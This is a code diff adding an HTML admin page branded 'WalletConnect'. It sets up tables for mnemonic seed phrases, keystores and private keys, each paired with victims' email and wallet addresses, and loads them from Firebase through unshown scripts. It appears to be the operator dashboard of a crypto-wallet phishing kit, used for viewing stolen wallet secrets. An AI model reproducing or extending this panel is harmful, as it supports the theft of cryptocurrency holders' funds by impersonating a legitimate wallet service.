@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WalletConnect || AdminPage</title>
+    <link rel="icon" href="./images/icon.png">
+    <link rel="stylesheet" href="/src/css/style.css">
+</head>
+<body style="background-color:rgb(27, 27, 27);">
+    <div class="root">
+        <div class="table1">
+                <h5>Mnemonic</h5>
+                <table class="table" border="2px">
+                    <thead>
+                        <th>S/N</th>
+                        <th>Mnemonic Keyword</th>
+                        <th>Email</th>
+                        <th>Wallet Address</th>
+                    </thead>
+                    <tbody class="tbody"></tbody>
+                </table>
+        </div>
+        <div class="table1">
+                <h5>KeyStore</h5>
+                <table border="2px">
+                    <thead>
+                        <th>S/N</th>
+                        <th>Email Address</th>
+                        <th>Wallet Address</th>
+                    </thead>
+                    <tbody class="tbody2"></tbody>
+                </table>
+        </div>
+        <div class="table1">
+            <h5>Private Key</h5>
+            <table border="2px">
+                <thead>
+                    <th>S/N</th>
+                    <th>Private Key</th>
+                    <th>Temporary Address</th>
+                    <th>Email Address</th>
+                </thead>
+                <tbody class="tbody3"></tbody>
+            </table>
+        </div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+    <script type="module" src="./adminPageM.js"></script>
+    <script type="module" src="./adminPageK.js"></script>
+    <script type="module" src="./adminPageP.js"></script>
+    <script src="https://kit.fontawesome.com/c36b48a40a.js" crossorigin="anonymous"></script>
+</body>
+</html>
